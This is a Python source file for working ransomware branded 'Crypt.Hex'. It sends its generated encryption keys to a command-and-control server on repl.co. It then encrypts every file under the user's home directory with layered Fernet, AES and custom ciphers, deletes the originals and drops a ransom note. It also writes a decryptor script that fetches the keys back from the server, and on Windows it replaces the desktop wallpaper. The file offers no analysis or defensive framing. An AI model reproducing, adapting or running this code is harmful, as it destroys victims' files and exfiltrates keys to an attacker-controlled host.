from Encryptor import AES_Encryption, Bush_Encryption, Fernet 
import base64,random,requests,socket,platform,time,os,threading

crypt_hex = '''HELLO NAME, WELCOME TO MY SERVICE

__________________________.+= Crypt.Hex =+.__________________________

                            !! Warning !!

All files are encrypted with Crypt.Hex
Don't worry, you can got decryptor free without payment anything.
If you think need decrypt file with play game/answer.
Nope can get decryptor free if you see in folder all.
It have some file got encrypted.

I should trust you?
Yes it free without anything.

Don't try to change file extension.
And don't trying use third part software because it not have today.
For decrypt Fernet + Aes + Bush + Base encryption

ID=GOT_ID

__________________________.+= Crypt.Hex =+.__________________________'''

decrypt = '''from Encryptor import AES_Encryption, Bush_Encryption, Fernet
import base64,os,socket,requests,threading

def decrypt(data,fernet_keys, keys, ivs, bush_keys):

 Fernet_Encryptor = Fernet(fernet_keys)
 Aes_Encryptor = AES_Encryption(key=keys, iv=ivs, mode=2)
 Bush_Encryptor = Bush_Encryption(key=bush_keys)

 chiper = base64.b16decode(data)
 chiper = Bush_Encryptor.decrypt(chiper)
 chiper = base64.b64decode(chiper)
 chiper = Aes_Encryptor.decrypt(chiper)
 chiper = Fernet_Encryptor.decrypt(chiper)

 return chiper

C2 = 'https://serverc2.idkotherhex1629.repl.co'

def list_scanner(path,extension):
  target_files = []
  for root, subfiles, files in os.walk(path):
    for file in files:
     if extension in file:
      target_files.append(file)
  return target_files

def got_decrypted(a,fernet_keys, keys, ivs, bush_keys,ex):
 with open(a,'rb') as f:
   got = decrypt(f.read(),fernet_keys, keys, ivs, bush_keys)

 with open(a.replace(ex,''),'wb') as f:
   f.write(got)
 os.remove(a)

extension = input("You extension files ( example .Encrypted ) ?")
list_scanner(os.path.dirname(__file__),extension)
id = input("YOU PERSONAL ID ?")
got = requests.get(C2+'/Downloads',headers={'Id-Got':id,'X-Client-Ip':socket.gethostname()}).content.decode()
fernet_keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[0]
keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[1].split('|')[0].replace('Key=','')
ivs = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[1].split('|')[1].replace('Iv=','')
bush_keys = got.split(' ')[1].replace('GOT=','').replace('"','').split('#')[2]

for a in list_scanner(os.path.expanduser('~'),extension):
  threading.Thread(target=got_decrypted,args=(a,fernet_keys, keys, ivs, bush_keys,extension)).start()

requests.get(C2+'/',headers={'Mode':'DEL',"Id-Got":id,'X-Client-Ip':socket.gethostname()})'''

def encrypt(data,fernet_keys, keys, ivs, bush_keys):

 Fernet_Encryptor = Fernet(fernet_keys)
 Aes_Encryptor = AES_Encryption(key=keys, iv=ivs, mode=2)
 Bush_Encryptor = Bush_Encryption(key=bush_keys)

 try:
   chiper = Fernet_Encryptor.encrypt(data).decode()
 except:
   chiper = Fernet_Encryptor.encrypt(data.encode()).decode()
 chiper = Aes_Encryptor.encrypt(chiper)
 chiper = base64.b64encode(chiper).decode()
 chiper = Bush_Encryptor.encrypt(chiper)
 chiper = base64.b16encode(chiper)

 return chiper

def generate_string(number):
   key = ''
   letter = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
   for _ in range(int(number)):
      key += random.choice(letter)
   return key

fernet_keys = Fernet.generate_key()
keys = generate_string(random.randint(16,4096))
ivs = generate_string(16)
bush_keys = generate_string(random.randint(16,4096))

C2 = 'https://serverc2.idkotherhex1629.repl.co'

id = requests.get(C2+'/ID_QUERY',headers={'X-Client-Ip':socket.gethostname()}).content.decode()
requests.get(C2+'/',headers={'Mode':'RECV','Id-Got':id,'X-Keys':f'{fernet_keys.decode()}#Key={keys}|Iv={ivs}#{bush_keys}','X-Client-Ip':socket.gethostname()})

def list_scanner(path):
  target_files = []
  for root, subfiles, files in os.walk(path):
    for file in files:
     if file != os.path.basename(__file__):
      target_files.append(file)
  return target_files

def got_encrypted(a,ex_file):
  try:
   with open(a,'r') as f:
    got = encrypt(f.read(),fernet_keys, keys, ivs, bush_keys)
  except:
   with open(a,'rb') as f:
    got = encrypt(f.read(),fernet_keys, keys, ivs, bush_keys)
  
  with open(a+ex_file,'wb') as f:
   f.write(got)
  
  os.remove(a)

ex_file = '.'+generate_string(random.randint(5,15))

for a in list_scanner(os.path.expanduser('~')):
  threading.Thread(target=got_encrypted,args=(a,ex_file)).start()

with open(os.path.dirname(__file__) + '/txt.--Decrypt_Crypt.Hex--.txt','w') as f:
  f.write(crypt_hex.replace('GOT_ID',id).replace('NAME',socket.gethostname()))

with open(os.path.dirname(__file__) + '/Setup_D3crypt0r.txt','w') as f:
  f.write("HEY IF YOU CAN'T DECRYPT THIS FILE.\nYOU NEED RUNNING COMMAND WITH PYTHON/PYTHON3 ONLY\nHERE COMMAND --> python3 Decryptor.py")

with open(os.path.dirname(__file__) + '/Decryptor.py','w') as f:
  f.write(decrypt)

if platform.system().upper() == 'WINDOWS':
 from PIL import Image, ImageDraw, ImageFont
 import ctypes

 char_setting = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 char_file = ''
 for bit_files in range(15):
    char_file += random.choice(char_setting)

 IMG_wallpaper = char_file + '.png'
 Img = Image.new("RGB", (2050, 1050))
 Canvas= ImageDraw.Draw(Img)
 font = ImageFont.truetype("arial", int(55))
 Canvas.text((10,10),(f"""\n\n
                                Oops, your important files are encrypted.\n
                            If decryption of the files is necessary\n
                            Please follow the file "Setup_D3crypt0r.txt"\n
                            If you believe this ransomware.\n
                            It not for educational purposes\n
                            Contact us "github.com/Hex1629."\n"""),fill=(255,0,0),font=font)                                                  
 Img.save(IMG_wallpaper)
 ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\{IMG_wallpaper}' , 0)
 time.sleep(0.3)
 os.remove(IMG_wallpaper)
